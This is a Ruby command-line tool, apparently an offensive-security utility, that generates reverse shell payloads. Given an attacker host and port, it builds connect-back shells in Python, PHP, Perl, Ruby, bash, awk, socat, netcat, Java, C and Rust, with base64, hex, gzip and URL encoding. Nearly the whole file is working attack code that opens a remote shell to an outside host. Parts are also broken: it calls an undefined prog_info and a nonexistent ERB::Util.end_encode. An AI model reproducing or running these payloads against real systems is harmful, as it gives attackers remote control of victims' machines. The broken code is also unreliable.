#!/usr/bin/env ruby

require "base64"
require "optparse"
require "erb"
require "zlib"
require "stringio"

PROGRAM_NAME = "REVERSE-SHELL".freeze()
PROGRAM_VERSION = "1.4.0".freeze()
EXECUTABLE_NAME = "reverse-shell.rb".freeze()

#define payload list.
PAYLOAD_LIST = [
	"python",
	"python_c",
	"python_b64",
	"python_hex",
	"python_ipv6",
	"python_ipv6_c",
	"python_ipv6_b64",
	"python_ipv6_hex",
	"nc",
	"nc_pipe",
	"php_fd",
	"php_fd_c",
	"php_fd_tags",
	"php_system_python_b64",
	"php_system_python_hex",
	"php_system_python_ipv6_b64",
	"php_system_python_ipv6_hex",
	"perl",
	"perl_c",
	"perl_b64",
	"perl_hex",
	"ruby",
	"ruby_c",
	"ruby_b64",
	"ruby_hex",
	"bash_tcp",
	"awk",
	"socat",
	"java_class",
	"c_binary",
	"rust_binary",
	"nc_openbsd"
].sort()

# Define dictionary of payload aliases for backwards compatibility with versions < 1.0.0.
PAYLOAD_BC_DICT = {
	"php_fd_3"=>{"payload"=>"php_fd", "fd"=>"3"},
	"php_fd_4"=>{"payload"=>"php_fd", "fd"=>"4"},
	"php_fd_5"=>{"payload"=>"php_fd", "fd"=>"5"},
	"php_fd_6"=>{"payload"=>"php_fd", "fd"=>"6"},
	"php_fd_3_c"=>{"payload"=>"php_fd_c", "fd"=>"3"},
	"php_fd_4_c"=>{"payload"=>"php_fd_c", "fd"=>"4"},
	"php_fd_5_c"=>{"payload"=>"php_fd_c", "fd"=>"5"},
	"php_fd_6_c"=>{"payload"=>"php_fd_c", "fd"=>"6"},
	"php_fd_3_tags"=>{"payload"=>"php_fd_tags", "fd"=>"3"},
	"php_fd_4_tags"=>{"payload"=>"php_fd_tags", "fd"=>"4"},
	"php_fd_5_tags"=>{"payload"=>"php_fd_tags", "fd"=>"5"},
	"php_fd_6_tags"=>{"payload"=>"php_fd_tags", "fd"=>"6"},
	"python3_c"=>{"payload"=>"python_c", "pv"=>"3"},
	"python2_c"=>{"payload"=>"python_c", "pv"=>"2"},
	"python3_b64"=>{"payload"=>"python_b64", "pv"=>"3"},
	"python2_b64"=>{"payload"=>"python_b64", "pv"=>"2"},
	"python3_hex"=>{"payload"=>"python_hex", "pv"=>"3"},
	"python2_hex"=>{"payload"=>"python_hex", "pv"=>"2"},
	"c_binary_b64"=>{"payload"=>"c_binary", "b64"=>true},
	"c_binary_hex"=>{"payload"=>"c_binary", "hex"=>true},
	"c_binary_gzip"=>{"payload"=>"c_binary", "gzip"=>true},
	"c_binary_gzip_b64"=>{"payload"=>"c_binary", "gzip_b64"=>true},
	"c_binary_gzip_hex"=>{"payload"=>"c_binary", "gzip_hex"=>true},
	"rust_binary_b64"=>{"payload"=>"rust_binary", "b64"=>true},
	"rust_binary_hex"=>{"payload"=>"rust_binary", "hex"=>true},
	"rust_binary_gzip"=>{"payload"=>"rust_binary", "gzip"=>true},
	"rust_binary_gzip_b64"=>{"payload"=>"rust_binary", "gzip_b64"=>true},
	"rust_binary_gzip_hex"=>{"payload"=>"rust_binary", "gzip_hex"=>true},
	"java_class_binary"=>{"payload"=>"java_class"},
	"java_class_b64"=>{"payload"=>"java_class", "b64"=>true},
	"java_class_gzip_b64"=>{"payload"=>"java_class", "gzip_b64"=>true}
}

option_parser = OptionParser.new do |options|
	options.banner = "\nUsage:\t#{EXECUTABLE_NAME} [OPTIONS] <PAYLOAD TYPE> <ATTACKER HOST> <ATTACKER PORT>\n"
	options.banner << "Note:\t<ATTACKER HOST> may be an IPv4 address, IPv6 address or hostname.\n\n"
	options.banner << "Example:\tlazypariah -u python_b64 10.10.14.4 1555\n"
	options.banner << "Example:\tlazypariah python_c malicious.local 1337\n\n"
	options.banner << "Valid Payloads:\n"
	PAYLOAD_LIST.each do |p|
		options.banner << "#{" "*4}#{p}\n"
	end
	options.banner << "\nValid Options:\n"
	options.on("-h", "--help", "Display help text and exit.")
	options.on("-l", "--license", "Display license information and exit.")
	options.on("-u", "--url", "URL-encode the payload.")
	options.on("-v", "--version", "Display version information and exit.")
	options.on("-D INTEGER", "--fd INTEGER", "Specify the file descriptor used by the target for TCP. Required for certain payloads.")
	options.on("-P INTEGER", "--pv INTEGER", "Specify Python version for payload. Must be either 2 or 3. By default, no version is specified.")
	options.on("-N", "--no-new-line", TrueClass, "Do not append a new-line character to the end of the payload.")
	options.on("--b64", "Encode a c_binary, rust_binary or java_class payload in base-64.")
	options.on("--hex", "Encode a c_binary, rust_binary or java_class payload in hexadecimal.")
	options.on("--gzip", "Compress a c_binary, rust_binary or java_class payload using zlib.")
	options.on("--gzip_b64", "Compress a c_binary, rust_binary or java_class payload using zlib and encode the result in base-64.")
	options.on("--gzip_hex", "Compress a c_binary, rust_binary or java_class payload using zlib and encode the result in hexadecimal.\n\n")
end

class String
    def port_check()
        (self.to_i.to_s == self) and (self.to_i >= 0 and self.to_i <= 65535)
    end
end

#define print_output
def print_output(s: "", url_encode: false, new_line: true)
    if url_encode
        print(ERB::Util.end_encode(s))
    else
        print(s)
    end
    if new_line
        puts("\n")
    end
end

# Attempt to parse command line arguments.
begin
	arguments = Hash.new()
	option_parser.parse!(into: arguments)

	if arguments[:version]
		prog_info(donation_info=false)
		exit()
	else
		if arguments.length < 1 and ARGV.length < 1
			prog_info()
			puts("\nNo command line arguments were detected. Please consult the help text below for details on how to use #{PROGRAM_NAME}.\n")
			puts(option_parser)
			exit()
		elsif arguments[:help]
			prog_info()
			puts(option_parser)
			exit()
		elsif arguments[:license]
			prog_info(donation_info=false)
			puts("\nThis program is free software: you can redistribute it and/or modify it under the terms of the GNU General Public License as published by the Free Software Foundation, either version 3 of the License, or (at your option) any later version. This program is distributed in the hope that it will be useful, but WITHOUT ANY WARRANTY; without even the implied warranty of MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE. See the GNU General Public License for more details. You should have received a copy of the GNU General Public License along with this program. If not, see <https://www.gnu.org/licenses/>.")
		elsif ARGV.length < 3
			prog_info()
			puts("\nThe command line arguments given to #{PROGRAM_NAME} were insufficient. #{PROGRAM_NAME} requires a payload type, attacker IP address and an attacker port in order to generate a reverse shell payload.\n")
			puts(option_parser)
			exit()
		elsif ARGV.length > 3
			prog_info()
			puts("\nToo many command line arguments were given to #{PROGRAM_NAME}.\n")
			puts(option_parser)
			exit()
		elsif not PAYLOAD_LIST.include?(ARGV[0]) and not PAYLOAD_BC_DICT.include?(ARGV[0])
			prog_info()
			puts("\n#{PROGRAM_NAME} did not recognise the specified payload. Please consult the valid list of payloads below.\n")
			puts(option_parser)
			exit()
		elsif not ARGV[2].port_check()
			prog_info()
			puts("\nThe specified port was invalid. Please specify a port between 0 and 65535 (inclusive).\n\n")
		else
			url_encode = arguments[:url] ? true: false

			# Get TCP file descriptor from command-line argument, if provided. This is required for some payloads (e.g. php_fd).
			tcp_fd = arguments[:"fd"]
			if tcp_fd and not tcp_fd.to_i().to_s() == tcp_fd
				puts("Invalid file descriptor detected. When specifying a file descriptor via the command-line argument \"-D INTEGER\" or \"--fd INTEGER\", that file descriptor must be a valid integer (e.g. 3, 4, 5 or 6).")
				exit()
			end

			# Get Python version from command-line argument, if provided. This is useful for some payloads (e.g. python_b64).
			python_version = arguments[:"pv"]
			if python_version and ((not python_version.to_i().to_s() == python_version) or (not ["2", "3"].include?(python_version)))
				puts("The Python version specified for the payload was invalid. When specifying a Python version for a payload via the command-line argument \"-P INTEGER\" or \"--pv INTEGER\", that version must be equal to either \"2\" or \"3\".")
				exit()
			end

			# Parse encoding/compression command-line arguments for binary payloads.
			b64_payload = arguments[:"b64"]
			hex_payload = arguments[:"hex"]
			gzip_payload = arguments[:"gzip"]
			gzip_b64_payload = arguments[:"gzip_b64"]
			gzip_hex_payload = arguments[:"gzip_hex"]

			# Ensure that only one encoding/compression command-line argument can be used for binary payloads.
			bin_cla_counter = 0
			bin_cla_array = [b64_payload, hex_payload, gzip_payload, gzip_b64_payload, gzip_hex_payload]
			bin_cla_array.each do |a|
				bin_cla_counter += a ? 1 : 0
			end
			if bin_cla_counter > 1
				puts("More than one encoding/compression-related command-line argument was entered. This error arises when e.g. --b64 and --gzip are both used together as separate command-line arguments. If you would like to use zlib to compress a binary payload such as c_binary or java_class and encode the result in base-64, use --gzip_b64. Only one encoding/compression-related command-line argument may be used.")
				exit()
			end

			# Parse payload, applying aliases for backwards compatibility with versions < 1.0.0.
			if PAYLOAD_BC_DICT.include?(ARGV[0])
				bc_dict = PAYLOAD_BC_DICT[ARGV[0]]
				selected_payload = bc_dict["payload"]
				tcp_fd = bc_dict["fd"]
				python_version = bc_dict["pv"]
				b64_payload = bc_dict["b64"]
				hex_payload = bc_dict["hex"]
				gzip_payload = bc_dict["gzip"]
				gzip_b64_payload = bc_dict["gzip_b64"]
				gzip_hex_payload = bc_dict["gzip_hex"]
			else
				selected_payload = ARGV[0]
			end

			case selected_payload
			when "python"
				# Python reverse shell.
				print_output(s: "import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"#{ARGV[1]}\",#{ARGV[2]}));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\"/bin/sh\",\"-i\"]);", url_encode: url_encode, new_line: !arguments[:"no-new-line"])
			when "python_ipv6"
				# Python IPv6 reverse shell.
				print_output(s: "import socket,subprocess,os;s=socket.socket(socket.AF_INET6,socket.SOCK_STREAM);s.connect((\"#{ARGV[1]}\",#{ARGV[2]},0,2));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\"/bin/sh\",\"-i\"]);", url_encode: url_encode, new_line: !arguments[:"no-new-line"])
			when "python_c"
				# Python reverse shell (intended to be run as a command from a shell session).
				print_output(s: "python#{python_version} -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"#{ARGV[1]}\",#{ARGV[2]}));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\"/bin/sh\",\"-i\"]);'", url_encode: url_encode, new_line: !arguments[:"no-new-line"])
			when "python_ipv6_c"
				# Python IPv6 reverse shell (intended to be run as a command from a shell session).
				print_output(s: "python#{python_version} -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET6,socket.SOCK_STREAM);s.connect((\"#{ARGV[1]}\",#{ARGV[2]},0,2));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\"/bin/sh\",\"-i\"]);'", url_encode: url_encode, new_line: !arguments[:"no-new-line"])
			when "python_b64"
				# Base-64-encoded Python reverse shell (intended to be run as a command from a shell session).
				code = Base64.strict_encode64("import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"#{ARGV[1]}\",#{ARGV[2]}));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\"/bin/sh\",\"-i\"]);")
				print_output(s: "echo #{code} | base64 -d | python#{python_version}", url_encode: url_encode, new_line: !arguments[:"no-new-line"])
			when "python_ipv6_b64"
				# Base-64-encoded Python IPv6 reverse shell (intended to be run as a command from a shell session).
				code = Base64.strict_encode64("import socket,subprocess,os;s=socket.socket(socket.AF_INET6,socket.SOCK_STREAM);s.connect((\"#{ARGV[1]}\",#{ARGV[2]},0,2));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\"/bin/sh\",\"-i\"]);")
				print_output(s: "echo #{code} | base64 -d | python#{python_version}", url_encode: url_encode, new_line: !arguments[:"no-new-line"])
			when "python_hex"
				# Hex-encoded Python reverse shell (intended to be run as a command from a shell session).
				code = "import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"#{ARGV[1]}\",#{ARGV[2]}));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\"/bin/sh\",\"-i\"]);".unpack("H*")[0]
				print_output(s: "echo #{code} | xxd -p -r - | python#{python_version}", url_encode: url_encode, new_line: !arguments[:"no-new-line"])
			when "python_ipv6_hex"
				# Hex-encoded Python IPv6 reverse shell (intended to be run as a command from a shell session).
				code = "import socket,subprocess,os;s=socket.socket(socket.AF_INET6,socket.SOCK_STREAM);s.connect((\"#{ARGV[1]}\",#{ARGV[2]},0,2));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\"/bin/sh\",\"-i\"]);".unpack("H*")[0]
				print_output(s: "echo #{code} | xxd -p -r - | python#{python_version}", url_encode: url_encode, new_line: !arguments[:"no-new-line"])
			when "php_system_python_b64"
				# Hybrid shell: python_b64 payload contained within a system function in a miniature PHP script.
				python_code = Base64.strict_encode64("import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"#{ARGV[1]}\",#{ARGV[2]}));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\"/bin/sh\",\"-i\"]);")
				print_output(s: "<?php system(\"echo #{python_code} | base64 -d | python#{python_version}\"); ?>", url_encode: url_encode, new_line: !arguments[:"no-new-line"])
			when "php_system_python_ipv6_b64"
				# Hybrid shell: python_ipv6_b64 payload contained within a system function in a miniature PHP script.
				python_code = Base64.strict_encode64("import socket,subprocess,os;s=socket.socket(socket.AF_INET6,socket.SOCK_STREAM);s.connect((\"#{ARGV[1]}\",#{ARGV[2]},0,2));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\"/bin/sh\",\"-i\"]);")
				print_output(s: "<?php system(\"echo #{python_code} | base64 -d | python#{python_version}\"); ?>", url_encode: url_encode, new_line: !arguments[:"no-new-line"])
			when "php_system_python_hex"
				# Hybrid shell: python_hex payload contained within a system function in a miniature PHP script.
				python_code = "import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"#{ARGV[1]}\",#{ARGV[2]}));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\"/bin/sh\",\"-i\"]);".unpack("H*")[0]
				print_output(s: "<?php system(\"echo #{python_code} | xxd -p -r - | python#{python_version}\"); ?>", url_encode: url_encode, new_line: !arguments[:"no-new-line"])
			when "php_system_python_ipv6_hex"
				# Hybrid shell: python_ipv6_hex payload contained within a system function in a miniature PHP script.
				python_code = "import socket,subprocess,os;s=socket.socket(socket.AF_INET6,socket.SOCK_STREAM);s.connect((\"#{ARGV[1]}\",#{ARGV[2]},0,2));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\"/bin/sh\",\"-i\"]);".unpack("H*")[0]
				print_output(s: "<?php system(\"echo #{python_code} | xxd -p -r - | python#{python_version}\"); ?>", url_encode: url_encode, new_line: !arguments[:"no-new-line"])
			when "nc"
				# Netcat reverse shell.
				print_output(s: "nc -e /bin/sh #{ARGV[1]} #{ARGV[2]}", url_encode: url_encode, new_line: !arguments[:"no-new-line"])
			when "nc_pipe"
				# Alternative netcat reverse shell (using a pipe).
				print_output(s: "/bin/sh | nc #{ARGV[1]} #{ARGV[2]}", url_encode: url_encode, new_line: !arguments[:"no-new-line"])
			when "php_fd", "php_fd_c", "php_fd_tags"
				# PHP reverse shells targeting a particular file descriptor (FD).
				if not tcp_fd
					puts("The payload you have selected requires a file descriptor to be specified. Please specify the file descriptor used by the target for TCP via the command-line argument \"-D NUMBER\" or \"--fd NUMBER\".")
				else
					case selected_payload
					when "php_fd"
						# Basic PHP reverse shell (without PHP tags).
						print_output(s: "$sock=fsockopen(\"#{ARGV[1]}\",#{ARGV[2]});exec(\"/bin/sh -i <&#{tcp_fd} >&#{tcp_fd} 2>&#{tcp_fd}\");", url_encode: url_encode, new_line: !arguments[:"no-new-line"])
					when "php_fd_c"
						# Basic PHP reverse shell (intended to be run as a command from a shell session).
						print_output(s: "php -r '$sock=fsockopen(\"#{ARGV[1]}\",#{ARGV[2]});exec(\"/bin/sh -i <&#{tcp_fd} >&#{tcp_fd} 2>&#{tcp_fd}\");'", url_encode: url_encode, new_line: !arguments[:"no-new-line"])
					when "php_fd_tags"
						# Basic PHP reverse shell (with PHP tags).
						print_output(s: "<?php $sock=fsockopen(\"#{ARGV[1]}\",#{ARGV[2]});exec(\"/bin/sh -i <&#{tcp_fd} >&#{tcp_fd} 2>&#{tcp_fd}\");?>", url_encode: url_encode, new_line: !arguments[:"no-new-line"])
					end
				end
			when "perl"
				# Perl reverse shell.
				print_output(s: "use Socket;$i=\"#{ARGV[1]}\";$p=#{ARGV[2]};socket(S,PF_INET,SOCK_STREAM,getprotobyname(\"tcp\"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,\">&S\");open(STDOUT,\">&S\");open(STDERR,\">&S\");exec(\"/bin/sh -i\");};", url_encode: url_encode, new_line: !arguments[:"no-new-line"])
			when "perl_c"
				# Perl reverse shell (intended to be run as a command from a shell session).
				print_output(s: "perl -e 'use Socket;$i=\"#{ARGV[1]}\";$p=#{ARGV[2]};socket(S,PF_INET,SOCK_STREAM,getprotobyname(\"tcp\"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,\">&S\");open(STDOUT,\">&S\");open(STDERR,\">&S\");exec(\"/bin/sh -i\");};'", url_encode: url_encode, new_line: !arguments[:"no-new-line"])
			when "perl_b64"
				# Base-64-encoded Perl reverse shell (intended to be run as a command from a shell session).
				code = Base64.strict_encode64("use Socket;$i=\"#{ARGV[1]}\";$p=#{ARGV[2]};socket(S,PF_INET,SOCK_STREAM,getprotobyname(\"tcp\"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,\">&S\");open(STDOUT,\">&S\");open(STDERR,\">&S\");exec(\"/bin/sh -i\");};")
				print_output(s: "echo #{code} | base64 -d | perl", url_encode: url_encode, new_line: !arguments[:"no-new-line"])
			when "perl_hex"
				# Hex-encoded Perl reverse shell (intended to be run as a command from a shell session).
				code = "use Socket;$i=\"#{ARGV[1]}\";$p=#{ARGV[2]};socket(S,PF_INET,SOCK_STREAM,getprotobyname(\"tcp\"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,\">&S\");open(STDOUT,\">&S\");open(STDERR,\">&S\");exec(\"/bin/sh -i\");};".unpack("H*")[0]
				print_output(s: "echo #{code} | xxd -p -r - | perl", url_encode: url_encode, new_line: !arguments[:"no-new-line"])
			when "ruby"
				# Ruby reverse shell.
				print_output(s: "require \"socket\";exit if fork;c=TCPSocket.new(\"#{ARGV[1]}\",\"#{ARGV[2]}\");while(cmd=c.gets);IO.popen(cmd,\"r\"){|io|c.print io.read}end", url_encode: url_encode, new_line: !arguments[:"no-new-line"])
			when "ruby_c"
				# Ruby reverse shell (intended to be run as a command from a shell session).
				print_output(s: "ruby -e 'require \"socket\";exit if fork;c=TCPSocket.new(\"#{ARGV[1]}\",\"#{ARGV[2]}\");while(cmd=c.gets);IO.popen(cmd,\"r\"){|io|c.print io.read}end'", url_encode: url_encode, new_line: !arguments[:"no-new-line"])
			when "ruby_b64"
				# Base-64-encoded Ruby reverse shell (intended to be run as a command from a shell session).
				code = Base64.strict_encode64("require \"socket\";exit if fork;c=TCPSocket.new(\"#{ARGV[1]}\",\"#{ARGV[2]}\");while(cmd=c.gets);IO.popen(cmd,\"r\"){|io|c.print io.read}end")
				print_output(s: "echo #{code} | base64 -d | ruby", url_encode: url_encode, new_line: !arguments[:"no-new-line"])
			when "ruby_hex"
				# Hex-encoded Ruby reverse shell (intended to be run as a command from a shell session).
				code = "require \"socket\";exit if fork;c=TCPSocket.new(\"#{ARGV[1]}\",\"#{ARGV[2]}\");while(cmd=c.gets);IO.popen(cmd,\"r\"){|io|c.print io.read}end".unpack("H*")[0]
				print_output(s: "echo #{code} | xxd -p -r - | ruby", url_encode: url_encode, new_line: !arguments[:"no-new-line"])
			when "bash_tcp"
				# Bash reverse shell.
				print_output(s: "bash -i >& /dev/tcp/#{ARGV[1]}/#{ARGV[2]} 0>&1", url_encode: url_encode, new_line: !arguments[:"no-new-line"])
			when "awk"
				# Awk reverse shell.
				print_output(s: "awk 'BEGIN {s = \"/inet/tcp/0/#{ARGV[1]}/#{ARGV[2]}\"; while(42) {do {printf \"[Awk Reverse Shell] >> \" |& s; s |& getline c; if (c) {while ((c |& getline) > 0) print $0 |& s; close(c);}} while (c != \"exit\") close(s);}}' /dev/null", url_encode: url_encode, new_line: !arguments[:"no-new-line"])
			when "socat"
				# Socat reverse shell.
				print_output(s: "socat tcp-connect:#{ARGV[1]}:#{ARGV[2]} system:/bin/sh", url_encode: url_encode, new_line: !arguments[:"no-new-line"])
			when "nc_openbsd"
				# Netcat (OpenBSD) reverse shell.
				print_output(s: "rm /tmp/r; mkfifo /tmp/r; cat /tmp/r | /bin/sh -i 2>&1 | nc #{ARGV[1]} #{ARGV[2]} > /tmp/r", url_encode: url_encode, new_line: !arguments[:"no-new-line"])
			when "java_class"
				# Java class reverse shells (compiled on the fly).
				code = "import java.io.IOException;import java.io.InputStream;import java.io.OutputStream;import java.net.Socket;public class rs {public rs() throws Exception {Process p=new ProcessBuilder(\"/bin/sh\").redirectErrorStream(true).start();Socket s=new Socket(\"#{ARGV[1]}\",#{ARGV[2]});InputStream pi=p.getInputStream(),pe=p.getErrorStream(),si=s.getInputStream();OutputStream po=p.getOutputStream(),so=s.getOutputStream();while(!s.isClosed()) {while(pi.available()>0) {so.write(pi.read());}while(pe.available()>0) {so.write(pe.read());}while(si.available()>0) {po.write(si.read());}so.flush();po.flush();Thread.sleep(50);try {p.exitValue();break;} catch (Exception e) {}}p.destroy();s.close();}}"

				temp_dir = IO.popen("mktemp -dt lazypariah_XXXXXXXX").read().chomp()
				temp_file = temp_dir+"/rs.java"

				system("echo '#{code}' > #{temp_file}; javac #{temp_file};")

				File.open(temp_dir+"/rs.class", "r") do |f|
					java_payload = f.read()
					if b64_payload
						java_payload_b64 = Base64.strict_encode64(java_payload)
						print_output(s: java_payload_b64, url_encode: url_encode, new_line: !arguments[:"no-new-line"])
					elsif hex_payload
						# Hex-encoded java_class payload.
						java_payload_hex = java_payload.unpack("H*")[0]
						print_output(s: java_payload_hex, new_line: !arguments[:"no-new-line"])
					elsif gzip_payload
						# Zlib-compressed java_class payload.
						sio = StringIO.new()
						sio.binmode()
						gz = Zlib::GzipWriter.new(sio)
						gz.write(java_payload)
						gz.close()
						java_payload_gzip = sio.string
						print_output(s: java_payload_gzip, new_line: false)
					elsif gzip_b64_payload
						# Zlib-compressed and base-64-encoded java_class payload.
						sio = StringIO.new()
						sio.binmode()
						gz = Zlib::GzipWriter.new(sio)
						gz.write(java_payload)
						gz.close()
						java_payload_gzip = sio.string
						java_payload_gzip_b64 = Base64.strict_encode64(java_payload_gzip)
						print_output(s: java_payload_gzip_b64, url_encode: url_encode, new_line: !arguments[:"no-new-line"])
					elsif gzip_hex_payload
						# Zlib-compressed and hex-encoded java_class payload.
						sio = StringIO.new()
						sio.binmode()
						gz = Zlib::GzipWriter.new(sio)
						gz.write(java_payload)
						gz.close()
						java_payload_gzip = sio.string
						java_payload_gzip_hex = java_payload_gzip.unpack("H*")[0]
						print_output(s: java_payload_gzip_hex, new_line: !arguments[:"no-new-line"])
					else
						# Standard java_class payload.
						print_output(s: java_payload, new_line: false)
					end
				end

				system("rm -r #{temp_dir}")
			when "c_binary"
				# C binary reverse shells (compiled on the fly).
				code = "#include <stdio.h>\n#include <sys/socket.h>\n#include <sys/types.h>\n#include <stdlib.h>\n#include <unistd.h>\n#include <netinet/in.h>\n#include <arpa/inet.h>\nint main(void){int port = #{ARGV[2]};struct sockaddr_in revsockaddr;int sockt = socket(AF_INET, SOCK_STREAM, 0);revsockaddr.sin_family = AF_INET;revsockaddr.sin_port = htons(port);revsockaddr.sin_addr.s_addr = inet_addr(\"#{ARGV[1]}\");connect(sockt, (struct sockaddr *) &revsockaddr, sizeof(revsockaddr));dup2(sockt, 0);dup2(sockt, 1);dup2(sockt, 2);char * const argv[] = {\"/bin/sh\", NULL};execve(\"/bin/sh\", argv, NULL);\nreturn 0;}"

				temp_dir = IO.popen("mktemp -dt lazypariah_XXXXXXXX").read().chomp()
				temp_file = temp_dir+"/rs.c"

				system("echo '#{code}' > #{temp_file}; gcc #{temp_file} -o #{temp_dir+"/rs"};")

				File.open(temp_dir+"/rs", "r") do |f|
					binary_payload = f.read()
					if b64_payload
						# Base-64-encoded c_binary payload.
						binary_payload_b64 = Base64.strict_encode64(binary_payload)
						print_output(s: binary_payload_b64, url_encode: url_encode, new_line: !arguments[:"no-new-line"])
					elsif hex_payload
						# Hex-encoded c_binary payload.
						binary_payload_hex = binary_payload.unpack("H*")[0]
						print_output(s: binary_payload_hex, new_line: !arguments[:"no-new-line"])
					elsif gzip_payload
						# Zlib-compressed c_binary payload.
						sio = StringIO.new()
						sio.binmode()
						gz = Zlib::GzipWriter.new(sio)
						gz.write(binary_payload)
						gz.close()
						binary_payload_gzip = sio.string
						print_output(s: binary_payload_gzip, new_line: false)
					elsif gzip_b64_payload
						# Zlib-compressed and base-64-encoded c_binary payload.
						sio = StringIO.new()
						sio.binmode()
						gz = Zlib::GzipWriter.new(sio)
						gz.write(binary_payload)
						gz.close()
						binary_payload_gzip = sio.string
						binary_payload_gzip_b64 = Base64.strict_encode64(binary_payload_gzip)
						print_output(s: binary_payload_gzip_b64, url_encode: url_encode, new_line: !arguments[:"no-new-line"])
					elsif gzip_hex_payload
						# Zlib-compressed and hex-encoded c_binary payload.
						sio = StringIO.new()
						sio.binmode()
						gz = Zlib::GzipWriter.new(sio)
						gz.write(binary_payload)
						gz.close()
						binary_payload_gzip = sio.string
						binary_payload_gzip_hex = binary_payload_gzip.unpack("H*")[0]
						print_output(s: binary_payload_gzip_hex, new_line: !arguments[:"no-new-line"])
					else
						# Standard c_binary payload.
						print_output(s: binary_payload, new_line: false)
					end
				end

				system("rm -r #{temp_dir}")
			when "rust_binary"
				# Rust binary reverse shells (compiled on the fly).
				code = "use std::net::TcpStream;use std::os::unix::io::{AsRawFd, FromRawFd};use std::process::{Command, Stdio};fn main() {let lhost: &str = \"#{ARGV[1]}\";let lport: &str = \"#{ARGV[2]}\";let tcp_stream = TcpStream::connect(format!(\"{}:{}\", lhost, lport)).unwrap();let fd = tcp_stream.as_raw_fd();Command::new(\"/bin/sh\").arg(\"-i\").stdin(unsafe {Stdio::from_raw_fd(fd)}).stdout(unsafe {Stdio::from_raw_fd(fd)}).stderr(unsafe {Stdio::from_raw_fd(fd)}).spawn().unwrap().wait().unwrap();}"

				temp_dir = IO.popen("mktemp -dt lazypariah_XXXXXXXX").read().chomp()
				temp_file = temp_dir+"/rs.rs"

				system("echo '#{code}' > #{temp_file}; rustc #{temp_file} -o #{temp_dir+"/rs"};")

				File.open(temp_dir+"/rs", "r") do |f|
					binary_payload = f.read()
					if b64_payload
						# Base-64-encoded rust_binary payload.
						binary_payload_b64 = Base64.strict_encode64(binary_payload)
						print_output(s: binary_payload_b64, url_encode: url_encode, new_line: !arguments[:"no-new-line"])
					elsif hex_payload
						# Hex-encoded rust_binary payload.
						binary_payload_hex = binary_payload.unpack("H*")[0]
						print_output(s: binary_payload_hex, new_line: !arguments[:"no-new-line"])
					elsif gzip_payload
						# Zlib-compressed rust_binary payload.
						sio = StringIO.new()
						sio.binmode()
						gz = Zlib::GzipWriter.new(sio)
						gz.write(binary_payload)
						gz.close()
						binary_payload_gzip = sio.string
						print_output(s: binary_payload_gzip, new_line: false)
					elsif gzip_b64_payload
						# Zlib-compressed and base-64-encoded rust_binary payload.
						sio = StringIO.new()
						sio.binmode()
						gz = Zlib::GzipWriter.new(sio)
						gz.write(binary_payload)
						gz.close()
						binary_payload_gzip = sio.string
						binary_payload_gzip_b64 = Base64.strict_encode64(binary_payload_gzip)
						print_output(s: binary_payload_gzip_b64, url_encode: url_encode, new_line: !arguments[:"no-new-line"])
					elsif gzip_hex_payload
						# Zlib-compressed and hex-encoded rust_binary payload.
						sio = StringIO.new()
						sio.binmode()
						gz = Zlib::GzipWriter.new(sio)
						gz.write(binary_payload)
						gz.close()
						binary_payload_gzip = sio.string
						binary_payload_gzip_hex = binary_payload_gzip.unpack("H*")[0]
						print_output(s: binary_payload_gzip_hex, new_line: !arguments[:"no-new-line"])
					else
						# Standard rust_binary payload.
						print_output(s: binary_payload, new_line: false)
					end
				end

				system("rm -r #{temp_dir}")
			end
		end
	end
rescue OptionParser::InvalidOption, OptionParser::MissingArgument
	# Invalid command line arguments were detected. Say so, display the help text, and exit.
	puts("\nOne or more command line arguments were invalid.\n")
	puts(option_parser)
	exit()
end